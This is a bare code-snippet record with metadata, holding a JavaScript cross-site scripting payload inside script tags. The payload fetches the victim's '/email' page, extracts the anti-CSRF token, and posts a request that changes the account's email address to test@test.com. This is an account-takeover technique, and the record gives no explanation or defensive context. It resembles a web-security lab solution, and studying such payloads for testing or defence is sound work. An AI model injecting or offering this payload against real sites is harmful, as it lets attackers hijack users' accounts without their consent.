---
id: ee7ad8f0-858f-4565-85e7-e6edd28bce30
type: code
language: JavaScript
verified: false
created_at: '2020-08-05T15:51:59.877632+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet ee7ad8f0

**Language**: JavaScript

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```


